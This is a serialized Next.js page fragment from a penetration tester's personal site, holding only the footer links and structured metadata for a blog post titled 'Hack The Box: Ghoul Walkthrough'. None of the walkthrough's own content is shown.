+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T50d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-ghoul-walkthrough/#article","headline":"Hack The Box: Ghoul Walkthrough","description":"An archived walkthrough of the retired Hack The Box Ghoul machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-ghoul-walkthrough/","datePublished":"2026-06-11T13:12:45.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2419,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/a419ee77d26c4d6599604de57f568424cdc7a8db/HTB-Ghoul.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-ghoul-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-ghoul-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Ghoul Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-ghoul-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
